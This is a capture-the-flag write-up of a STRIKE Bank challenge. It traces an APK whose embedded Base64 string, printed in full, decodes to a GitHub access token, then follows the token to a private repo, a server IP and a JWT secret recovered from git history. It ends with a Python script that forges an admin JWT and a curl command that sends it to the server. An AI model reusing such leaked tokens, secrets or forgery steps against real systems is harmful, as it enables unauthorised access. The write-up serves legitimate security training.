# CTF Writeup: STRIKE Bank Heist (Ticket)

**Category:** Web / Cryptography / Mobile Recon
**Tools Used:** Apktool/JADX, Kali Linux Terminal, cURL, Python

## Challenge Objective
Investigate a suspicious Android application (`ticket.apk`) used by STRIKE Bank employees, pivot through exposed infrastructure, and exploit a misconfigured authentication mechanism to uncover the hidden flag.

---

## Step 1: APK Reconnaissance

The challenge begins with an Android package (`ticket.apk`). The first step is to decompile the application and analyze its resources for hardcoded secrets. 

By inspecting the decompiled `resources.arsc` file, I discovered a Firebase URL and a suspicious Base64 encoded string:
`dXNlcjpnaXRodWJfcGF0XzExQjJQVDNKWTBueFNtSnlRZjdPSFZfWENvM243ZTJXcUd2bzB0NnV5SnNUVzJNSlRoRjBJdDNRTklrSHRPUjhnQUxOSDVQUjVYbDBKOTJ2WDM=`

Decoding this string revealed a live GitHub Personal Access Token (PAT).
![Decoded PAT](/assets/01_decoded_pat.png)

## Step 2: Pivoting to Infrastructure via GitHub API

With active credentials, I queried the GitHub API to enumerate the repositories accessible by this token. 

```bash
curl -u "user:<GITHUB_PAT>" [https://api.github.com/user/repos](https://api.github.com/user/repos)
```
This led to a private repository named `suryanandanmajumder/ticket`, labeled "Backend for STRIKE Bank." Inspecting the `Dockerfile` inside this repository revealed the live production server IP: `15.206.47.5:8080`.

![docker file ip exposure](/assets/02_dockerfile_ip.png)

## Step 3: Source Code & Git History Analysis
Pulling the backend source code (`index.php` and `login.php`) revealed that the portal used JSON Web Tokens (JWT) for authentication.

While the current codebase validated tokens using an empty string (`$secret = ''`), exploiting this on the live server only returned a fake flag (`CloudSEK{f4k3_fl4g}`). This indicated the real secret was hidden in the Git commit history.

By analyzing the commit logs, I found the initial commit (`10b7af9b1ac916f5f37ca307b0a932f61d029db4`) where the developer first created the dashboard. Checking the diff for this commit exposed the original, hardcoded JWT signing secret before it was removed.

![git diff secret](/assets/03_git_diff_secret.png)

## Step 4: Forging the Admin JWT
Armed with the original cryptographic key, I wrote a Python script to forge a new JWT. I set the payload to elevate my privileges to `admin` and signed it using `Str!k3B4nkSup3rs3cr37`.

```bash
import base64
import json
import hmac
import hashlib
import time

header = {"alg": "HS256", "typ": "JWT"}
header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')

# Elevate to admin
payload = {"username": "admin", "exp": int(time.time()) + 3600}
payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')

# The REAL secret recovered from the git history
secret = b"Str!k3B4nkSup3rs3cr37"
message = f"{header_b64}.{payload_b64}".encode()
signature = hmac.new(secret, message, hashlib.sha256).digest()
signature_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')

print(f"{header_b64}.{payload_b64}.{signature_b64}")
```
![forged jwt](/assets/04_forged_jwt.png)

## Step 5: The Exploit
Finally, I injected the forged JWT into my HTTP request to the live server using the auth cookie parameter.

```bash
curl -s -b "eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJleHAiOiAxNzc3MTkzMTg1fQ.QxhukDs24BOvfJj3n6TlPUkASCPI0ypXQ_naF-iI6iw" http://15.206.47.5:8080/index.php | grep -i "flag"
```
The server accepted the cryptographically valid token, authenticated the session as the administrator, and revealed the final flag!

![final flag](/assets/05_final_flag.png)

Flag: `CloudSEK{pl4y!ng_w!7h_jw7_i$_fun}`